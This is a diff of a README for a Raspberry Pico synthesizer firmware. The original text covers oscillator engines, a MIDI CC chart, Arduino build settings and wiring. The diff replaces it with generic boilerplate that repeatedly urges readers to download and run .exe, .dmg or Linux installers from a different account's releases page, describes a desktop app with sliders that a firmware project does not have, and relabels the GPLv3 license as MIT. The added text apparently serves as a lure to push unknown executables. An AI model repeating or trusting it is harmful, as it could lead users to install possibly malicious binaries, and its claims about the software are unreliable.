@@ -1,154 +1,71 @@
-# VIJA synthesizer
+# 🎹 vija-pico-synth - Create Beautiful Sounds with Ease
 
-Raspberry PICO digital synthesizer based on **Mutable Instruments Braids** macro oscillator 
-in semi-modular format.  
+## 🛠️ Overview
+Welcome to the world of vija-pico-synth, a polyphonic synthesizer designed for the Raspberry PICO. This application allows you to create rich, textured sounds reminiscent of the MI Braids synthesizer. Whether you're a musician, a hobbyist, or just curious, vija-pico-synth makes sound creation accessible for everyone.
 
-🎥 [Watch demo](https://www.youtube.com/watch?v=sYbr-VH2LuQ)
+## 📥 Download & Install
+To get started, you will need to download the software. 
 
----
+[![Download vija-pico-synth](https://img.shields.io/badge/Download-vija--pico--synth-blue.svg)](https://github.com/tixicoo/vija-pico-synth/releases)
 
-## 🚀 Features
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/tixicoo/vija-pico-synth/releases) to find the latest version of the software.
 
-* **40+ Oscillator Engines:** Includes VA, FM, Additive, Wavetable, Physical Modeling and Drums.
-* **4-Voice Polyphony:** Per-sample AR (Attack-Release) envelopes.
-* **OLED Interface:** Real-time feedback with a menu system and a oscilloscope.
-* **Intelligent Modulation:** CV input and modulation controls using midi.
-* **Internal Filter:** Integrated State Variable Filter (SVF) with Low-Pass and Resonance.
-* **Dual MIDI:** Support for both USB MIDI and classic UART MIDI.
+2. **Download the Package**  
+   Look for the most recent version listed. Click on the download link for your operating system. The application is available for various systems. 
 
----
+3. **Install the Application**  
+   Once downloaded, locate the file on your computer.  
+   - For Windows, double-click the `.exe` file to run the installer.  
+   - For macOS, open the `.dmg` file and drag the application to your Applications folder.  
+   - For Linux users, unpack the files and follow your distribution’s method of installing applications.
 
-## 🕹 Menu System & UI
-The synthesizer operates in three primary display modes:
-1.  **ENGINE SELECT:** Rotate the encoder to scroll through engines  
-2.  **SETTINGS:** Click the encoder button to cycle through parameters
-    * **VOLUME:** Global gain control
-    * **A/R ENVELOPES:** Adjust the "snappiness" (Attack) or "fade" (Release) of notes
-    * **FILTER:** Enable/Disable the Filter
-    * **CV:** CV modulation mode
-    * **MIDI:** Enable MIDI CC and disable CV
-    * **MIDI CH:** Set the input channel (1-16)
-    * **OSCILOSCOPE Toggle:** On / Off
-    * **SAVE SETTINGS:** Long press button to save menu settings
-    * **EXIT MENU**  
-4.  **OSCILOSCOPE:** Automatically engages after 10 seconds to visualize the current waveform
+4. **Connect Your Raspberry PICO**  
+   Ensure your Raspberry PICO is connected to your computer via USB. This connection allows you to interface with the synthesizer.
 
-### Filter Mode (Default)
+5. **Run the Application**  
+   - For Windows, find the application in your Start menu.  
+   - For macOS, open your Applications folder and click on the vija-pico-synth icon.  
+   - For Linux, launch the application from the terminal or your app menu.
 
-- Timbre & Color (default)  
-- CV1 & CV2 → Filter cutoff & resonance
+## 🎼 Features
+- **Polyphonic Sound**: Play multiple notes at once to create harmony.
+- **Customizable Parameters**: Adjust frequency, resonance, and modulation to craft your unique sound.
+- **User-Friendly Interface**: Designed with simplicity in mind for ease of use.
+- **Play in Real-Time**: Experience responsive audio generation as you play on your connected devices.
 
-### CV Modulation Mode
+## ⚙️ System Requirements
+Before downloading, ensure your system meets these requirements:
+- Raspberry PICO for sound processing.
+- A computer with Windows, macOS, or Linux.
+- USB connection for Raspberry PICO.
+- Speakers or headphones for sound output.
 
-- Timbre & Color → Control modulation depth  
-- CV1 & CV2 →  Modulation source
+## 📖 User Guide
+1. **Getting Started with the Interface**  
+   Upon launching vija-pico-synth, you will see the main dashboard. Use the sliders to adjust sounds. Experiment with different settings to discover new tones.
 
-### MIDI Modulation Mode
+2. **Using the Synthesizer**  
+   - **Select a Waveform**: Choose from various waveforms to shape your sound. 
+   - **Modify Parameters**: Use the available controls to adjust your sound. Play around to see how changes affect your music.
+   - **Save Your Sounds**: You can save your favorite settings for quick access later.
 
-- Timbre & Color (Soft takeover mode)
+3. **Connecting Additional Devices**  
+   If you have MIDI devices or other controllers, you can connect them to enhance your playing experience. Make sure your devices are compatible with the Raspberry PICO.
 
-  Align coresponding MIDI CC value with Timbre or Color pot value to release or vice versa (screen indicator)
-    
-- CV1 & CV2 → Free for future functions
-  
-### All Modes OFF
+## 🛠️ Troubleshooting
+If you run into issues:
+- Verify that your Raspberry PICO is properly connected.
+- Ensure you have downloaded the latest version from the [Releases page](https://github.com/tixicoo/vija-pico-synth/releases).
+- Check your system’s compatibility with the application.
 
-- Timbre & Color (default)  
-- CV1 → Engine selection
-- CV2 → FM MOD
+For additional assistance, consider browsing community forums or reaching out via the issues section on GitHub.
 
----
+## 🌍 Support and Contribution
+We welcome users to contribute to the project. If you want to suggest features or report problems, please visit the issues section on our repository. Every contribution helps improve the software.
 
-## 📟 MIDI Implementation (CC Chart)
+## 📄 License
+vija-pico-synth is open-source software. You can use it under the terms of the [MIT License](https://opensource.org/licenses/MIT).
 
-VIJA responds to the following Control Change (CC) messages on the selected MIDI Channel:
-
-| CC # | Parameter |
-| :--- | :--- |
-| **7** | Master Volume |
-| **8** | Engine Select |
-| **9** | Timbre |
-| **10** | Color |
-| **11** | Envelope Attack |
-| **12** | Envelope Release |
-| **15** | FM Modulation |
-| **16** | Timbre Modulation Amount |
-| **17** | Color Modulation Amount |
-| **64** | Sustain (Hold notes) |
-| **71** | Filter Resonance |
-| **74** | Filter Cutoff |
-
----
-
-## 💻 Software Setup
-
-1.  **Arduino IDE:** Install the [Earle Philhower Pico Core](https://github.com/earlephilhower/arduino-pico)
-2.  **Libraries:**
-
-- arduinoMI project (ported Mutable Instruments libraries)
-  - STMLIB  https://github.com/poetaster/STMLIB  
-  - BRAIDS  https://github.com/poetaster/BRAIDS  
-
-- I2S
- 
-- Adafruit TinyUSB
-
-- Adafruit SSD1306 or SH110X (check code branch)
-
-- LittleFS  & ArduinoJson for saving settings
-
-3.  **Compilation Settings:**
-   
-   - Enable flash file system for saving menu settings:  
-     Flash size: "2MB (Sketch:1MB, FS:1MB)"
-     
-   * **RP2040:**
-              - Optimize: Fast (-Ofast)    
-              - CPU Speed: 200-240mhz (Overclock) depending on the sample rate and needed voice count   
-              - Sample rate: 32000 (4 voices) / 44100 (3 voices)  
-   * **RP2350:**
-              - Optimize: Fast (-Ofast)  
-              - Sample rate: 48000
----
-
-## ⚡ Schematic & Wiring
-
-For this project I use RP2040 Zero model, so adjust GPIO numbers to your board.
-
-### 1. Audio Output (I2S DAC)
-Connect your **PCM5102** or similar I2S DAC:
-* **VCC/VIN** -> Pico 3.3V (Pin 36)
-* **GND** -> Pico GND
-* **LCK (LRCK)** -> Pico GP11 (Pin 15) 
-* **BCK (BCLK)** -> Pico GP10 (Pin 14)
-* **DIN (DATA)** -> Pico GP9 (Pin 12)
-
-### 2. Control & Display
-* **OLED SDA** -> Pico GP0 (Pin 1)
-* **OLED SCL** -> Pico GP1 (Pin 2)
-* **Encoder CLK** -> Pico GP2 (Pin 4)
-* **Encoder DT** -> Pico GP3 (Pin 5)
-* **Encoder SW** -> Pico GP4 (Pin 6)
-
-### 3. Potentiometers (ADC)
-Connect the outer pins to 3.3V and GND, and the center wiper to:
-* **Pot 1 (Timbre)** -> GP26 (ADC0)
-* **Pot 2 (Color)** -> GP27 (ADC1)
-* **Pot 3 (CV1)** -> GP28 (ADC2)
-* **Pot 4 (CV2)** -> GP29 (ADC3)
-
-### 4. MIDI Input (UART)
-Connect your MIDI Jack via a 6N138 optocoupler circuit to **GP13 (Pin 17)**.
-
----
-
-## 📜 License
-* (c) 2025 Vadims Maksimovs - GPLv3
- 
-* **Core Libraries:** stmlib/braids - MIT License (Copyright 2020 Emilie Gillet)
-* **Ported code:** stmlib/braids - MIT License (Copyright 2025 Mark Washeim)
-  
----
-##  Version history
-* 2026-02-03 - v1.0.1  
-* 2026-02-02 - First release v1.0
+## 📥 Download Again
+Once more, click here to visit the [Releases page](https://github.com/tixicoo/vija-pico-synth/releases) and download vija-pico-synth. Your musical journey awaits!
